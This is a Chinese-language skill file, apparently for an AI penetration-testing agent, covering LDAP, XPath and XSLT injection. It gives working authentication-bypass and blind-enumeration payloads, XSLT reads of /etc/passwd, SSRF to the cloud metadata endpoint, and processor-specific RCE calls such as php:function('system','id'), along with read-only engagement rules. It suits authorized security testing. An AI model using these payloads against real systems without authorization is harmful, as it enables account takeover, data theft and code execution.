---
name: hunt-ldap-xpath
description: LDAP / XPath / XSLT 注入：LDAP 过滤器语法（& | ! = *）与认证绕过、盲注布尔与时间技巧；XPath 逻辑绕过与节点枚举；XSLT document() 任意文件读取与扩展函数 RCE。含登录框、组织架构查询、单点登录用户搜索、XML 报表等入口
whenToUse: "登录框/用户搜索用了目录服务（AD/LDAP/OpenLDAP）；参数进入 XML 查询；响应出现 XPath/XML 解析错误；存在 XSLT 转换、报表模板、SVG 渲染"
role: vuln-scan
enabled: true
---

# LDAP / XPath / XSLT 注入

> 来源：`knowledge-sources/PayloadsAllTheThings/LDAP Injection/README.md`(174 行)、`XPATH Injection/`、`XSLT Injection/`
> 知识库：`redteam_poc_search` 按 `category=other component=LDAP` 检索

## 一、LDAP 注入

### 1. 过滤器语法速查

```
( & (a=x)(b=y) )      AND
( | (a=x)(b=y) )      OR
( ! (a=x) )           NOT
(a=*)                 存在
(a=x*)                前缀匹配
```

注入点：用户输入被拼进 `(uid=<input>)`。

### 2. 认证绕过（最高价值）

```bash
# 原始：(uid=INPUT)(password=INPUT2)
# 用户名填 *  → (uid=*)(password=*)  → 匹配第一个用户
username=*&password=*

# 用户名填 *)(uid=*))(|(uid=*  → 闭合再开
username=*)(uid=*))(|(uid=*&password=x

# 已知管理员账号时，密码位注入
username=admin&password=*)(|(password=*

# 只绕过密码校验
username=admin)(&)&password=x
```

判据：登录成功 / 返回 token / 响应长度与失败明显不同。

### 3. 布尔盲注（枚举属性）

```bash
# 猜 admin 的 mail 首字母
username=admin)(mail=a*        → 200/正常
username=admin)(mail=b*        → 403/异常
# 二分收敛
username=admin)(&(mail=a*)(mail=b*)   # 同时满足 = 区间
```

### 4. 时间盲注（无布尔差异时）

某些实现支持 `(|(a=x)(&(b=y)(!(b=y))))` 造成全表扫描，响应时间显著变长。用固定 5 次取中位数对比，不看单次。

### 5. 常见误判

| 现象 | 真相 |
|---|---|
| 密码填 `*` 就登录失败 | 后端先 hash 再比对，未拼接 → 无洞 |
| 报 `javax.naming.directory.InvalidSearchFilterException` | **说明确实拼接了**，可继续 |
| 任意用户名都返回"用户不存在" | 有过滤，换编码 `%2a`、`\2a`、`\5c` 试 |
| 登录成功但界面空白 | 可能是匹配到空用户，仍算绕过 |

---

## 二、XPath 注入

### 1. 逻辑绕过

```bash
# 原始：//user[username/text()='INPUT' and password/text()='INPUT2']
username=' or '1'='1
username=' or 1=1 or '
username=x' or '1'='1' or 'a'='b

# 密码位
password=' or '1'='1
```

### 2. 盲注枚举（无回显时）

```bash
# 猜第一个用户名长度
' or string-length(//user[1]/username)=5 or 'a'='b
# 猜字符
' or substring(//user[1]/username,1,1)='a' or 'a'='b
# 枚举节点名（结构未知时）
' or count(//*)>10 or 'a'='b
' or name(//*[1])='users' or 'a'='b
```

### 3. 常见误判

| 现象 | 真相 |
|---|---|
| 报 `XPathException` / `Invalid expression` | 确认注入存在 |
| 输入引号后无差异 | 可能用了参数化查询或有转义 |
| 全部返回空 | 可能节点路径不对，先用 `//*` 探结构 |

---

## 三、XSLT 注入

入口：XML 导入、报表模板、SVG 渲染、SOAP 响应转换。

### 1. 任意文件读取

```xml
<xsl:template match="/">
  <xsl:copy-of select="document('/etc/passwd')"/>
</xsl:template>
```

```xml
<!-- 读不到纯文本时绕 XML 结构 -->
<xsl:value-of select="unparsed-text('/etc/passwd')"/>
```

### 2. SSRF / 内网探测

```xml
<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
```

### 3. RCE（取决于处理器）

| 处理器 | 手法 |
|---|---|
| Java (Xalan) | `document('')` + 命名空间反射调 `java.lang.Runtime` |
| PHP (libxslt) | `php:function('system','id')` 需 `registerPHPFunctions` |
| .NET (XslCompiledTransform) | 默认禁 script，需 `XsltSettings.EnableScript` |
| Saxon | `saxon:...` 扩展函数 |

Java 侧探针（先验证能否取到静态方法）：
```xml
<xsl:value-of select="java:java.lang.System.getProperty('user.name')" 
  xmlns:java="http://xml.apache.org/xalan/java"/>
```

### 4. 常见误判

| 现象 | 真相 |
|---|---|
| 提交 XSLT 后返回原 XML | 可能只是回显，未真的编译 |
| 报 `xsl:template` 非法 | 说明解析了，是注入点 |
| `document()` 报权限错 | 有沙箱，换 `unparsed-text` 或用 SSRF 方向 |

---

## 定级

| 结果 | 定级 |
|---|---|
| LDAP 认证绕过进管理后台 | **Critical** |
| LDAP 布尔盲注枚举出用户属性 | High |
| XPath 登录绕过 | High |
| XSLT 任意文件读取 | High |
| XSLT RCE | **Critical** |

## 纪律

- 只读不写：LDAP 不做 `add/modify`，XSLT 不写文件
- 盲注枚举到"能证明可枚举"即可，不批量拖全表
- 认证绕过拿到后台后**只截首页 + 用户信息页**，不点任何写操作
